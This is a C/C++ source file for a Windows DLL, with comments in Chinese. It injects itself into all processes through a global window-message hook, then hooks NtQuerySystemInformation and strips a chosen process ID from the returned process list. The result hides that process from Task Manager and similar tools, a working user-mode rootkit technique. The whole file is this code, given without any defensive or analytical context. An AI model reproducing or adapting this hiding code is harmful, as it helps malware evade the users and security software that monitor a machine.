#include <windows.h>
#pragma hdrstop

#include <Winnt.h>
#include <winbase.h>
#include <stdio.h>
#include <Tlhelp32.h>

#define _DLL_
#include "HookApi.h"
#include "HookClass.h"

//---------------------------------------------------------------------------

//NtQuerySystemInformation

typedef struct _THREAD_INFO
{
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER CreateTime;
	ULONG WaitTime;
	DWORD dwStartAddress;
	DWORD dwOwnerPID;
	DWORD dwThreadId;
	DWORD dwCurrentPriority;
	DWORD dwBasePriority;
	DWORD dwContextSwitches;
	DWORD dwThreadState;
	DWORD dwWaitReason;
	DWORD dwReserved;

}THREADINFO, *PTHREADINFO;

typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaxLength;
	PWSTR  Buffer;

} UNICODE_STRING;

typedef struct _PROCESS_INFO
{
	DWORD dwOffset;
	DWORD dwThreadsCount;
	DWORD dwUnused1[6];
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ProcessName;

	DWORD dwBasePriority;
	DWORD dwProcessID;
	DWORD dwParentProcessId;
	DWORD dwHandleCount;
	DWORD dwUnused3[2];

	DWORD dwVirtualBytesPeak;
	DWORD dwVirtualBytes;
	ULONG  dwPageFaults;
	DWORD dwWorkingSetPeak;
	DWORD dwWorkingSet;
	DWORD dwQuotaPeakPagedPoolUsage;
	DWORD dwQuotaPagedPoolUsage;
	DWORD dwQuotaPeakNonPagedPoolUsage;
	DWORD dwQuotaNonPagedPoolUsage;
	DWORD dwPageFileUsage;
	DWORD dwPageFileUsagePeak;

	DWORD      dCommitCharge;
	THREADINFO ThreadSysInfo[1];

} PROCESSINFO, *PPROCESSINFO;

typedef long (__stdcall *PNTQUERYSYSTEMINFORMATION)(DWORD,PVOID,ULONG,PULONG);

long __stdcall MyNtQuerySystemInformation(
	DWORD SysInformatoinClass,
	PVOID SystemInformation,          
	ULONG SystemInformationLength,
	PULONG ReturnLength OPTIONAL);

TAPIHook *NtQuerySystemInformationHook = NULL;

//---------------------------------------------------------------------------

//HHOOK hCallWndHook = NULL;

LRESULT CALLBACK CallWndHook(int nCode,WPARAM wParam,LPARAM lParam);

//---------------------------------------------------------------------------
//这个值只用来调用SetWindowsHookEx
HINSTANCE hInst;

#pragma data_seg("SHAREDATA")

HHOOK hCallWndHook = NULL;
DWORD dwSelfProcessID = -1;

#pragma data_seg()
#pragma comment(linker,"/section:SHAREDATA,RWS")


//为了需要，DLL一启动就自动Hook了GetProcAddress、LoadLibraryA、LoadLibraryW、
//LoadLibraryExA、LoadLibraryExW这5个函数（见HookClass.Cpp）。当调用Unhook之后，
//这个DLL将在别的进程中卸载，但是对于本进程来说。DLL并没有马上卸载，所以那几个
//Hook仍然起作用，为了实现真正意义上的Unohok，设置了这个标志，在那几个Hook里边
//将检查这个标志，以表明是否进行Hook。
bool IsHook = false;

//进行实际的Hook调用
int __fastcall HookFunc();
int __fastcall UnhookFunc();

//---------------------------------------------------------------------------
//#pragma argsused

BOOL APIENTRY DllMain( HANDLE hModule, DWORD  reason, LPVOID lpReserved)
{
	hInst = (HINSTANCE)hModule;	 

	if(reason == DLL_PROCESS_ATTACH)
	{
		DisableThreadLibraryCalls(hInst);
		__try
		{
			if(dwSelfProcessID != -1)
				HookFunc();
		}
		__except(EXCEPTION_EXECUTE_HANDLER)
		{/* Do nothing */}
	}
	else if(reason == DLL_PROCESS_DETACH)
	{
		__try
		{
			UnhookFunc();             
		}
		__except(EXCEPTION_EXECUTE_HANDLER)
		{/* Do nothing */}
	}

	return TRUE;
}
//---------------------------------------------------------------------------
//Hook
DLL_EXP_IMP int _cdecl Hook(DWORD dwSelfProcessID_P)
{                          
	dwSelfProcessID = dwSelfProcessID_P;

	if(hCallWndHook == NULL)
		hCallWndHook = SetWindowsHookEx(WH_CALLWNDPROC,(HOOKPROC)CallWndHook,hInst,0);

	// Hook指定的函数
	HookFunc();

	return 1;
}
//---------------------------------------------------------------------------
//Unhook
DLL_EXP_IMP int _cdecl Unhook()
{
	if(hCallWndHook != NULL)
	{
		UnhookWindowsHookEx(hCallWndHook);
		hCallWndHook = NULL;
	}

	// Unhook指定的函数
	UnhookFunc();

	return 1;
}           
//---------------------------------------------------------------------------
int __fastcall HookFunc()
{
	IsHook = true;
	SetThreadPriority(GetCurrentThread(),THREAD_PRIORITY_TIME_CRITICAL);

	NtQuerySystemInformationHook = new TAPIHook("NTDLL.DLL","NtQuerySystemInformation",
		(PROC)MyNtQuerySystemInformation,true);
	SetThreadPriority(GetCurrentThread(),THREAD_PRIORITY_NORMAL);
	return 1;
}
//---------------------------------------------------------------------------
int __fastcall UnhookFunc()
{
	//对于主程序本身，通过这个标志可以保证在没有退出主程序的时候也能Unhook。
	IsHook = false;

	if(NtQuerySystemInformationHook != NULL)
	{
		delete NtQuerySystemInformationHook;
		NtQuerySystemInformationHook = NULL;
	}
	return 1;
}
//---------------------------------------------------------------------------
//消息Hook，不做任何事，只是为了加载DLL到别的进程
LRESULT CALLBACK CallWndHook(int nCode,WPARAM wParam,LPARAM lParam)
{
	if(nCode < 0)
		return CallNextHookEx(hCallWndHook,nCode,wParam,lParam);
	// Do nothing
	return 0;               
}
//---------------------------------------------------------------------------
/*---------------------------------------------------------------------------

自定义的函数代码

//-------------------------------------------------------------------------*/
//---------------------------------------------------------------------------

long __stdcall MyNtQuerySystemInformation(
	DWORD SysInformatoinClass,
	PVOID SystemInformation,          
	ULONG SystemInformationLength,
	PULONG ReturnLength OPTIONAL)
{
	long Result;
	Result = ((PNTQUERYSYSTEMINFORMATION)(PROC)(*NtQuerySystemInformationHook))
		(SysInformatoinClass,SystemInformation,SystemInformationLength,ReturnLength);

	//一定要使用结构化异常处理，否则就有可能出现异常对话框。
	__try
	{
		if(SysInformatoinClass == 5 && Result == 0 /* STATUS_SUCCESS */)
		{
			PPROCESSINFO pProcessInfo;
			PPROCESSINFO pPrevProcessInfo;

			pProcessInfo = (PPROCESSINFO)SystemInformation;
			pPrevProcessInfo = pProcessInfo;
			while(true)
			{
				if(pProcessInfo != NULL && pProcessInfo->dwProcessID == dwSelfProcessID)
				{
					if(pProcessInfo->dwOffset == 0)
						pPrevProcessInfo->dwOffset = 0;
					else
						pPrevProcessInfo->dwOffset = pPrevProcessInfo->dwOffset + pProcessInfo->dwOffset;

					break;
				}

				if(pProcessInfo->dwOffset == 0)
					break;

				pPrevProcessInfo = pProcessInfo;
				pProcessInfo = (PPROCESSINFO)((byte*)pProcessInfo + pProcessInfo->dwOffset);
			}
		}
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		/*/ 发生异常，但是不必做任何事
		::MessageBox(NULL,"Exception Occured at self-defined function :(",NULL,MB_OK | MB_ICONWARNING);
		//*/
	}
	return Result;
}
//---------------------------------------------------------------------------
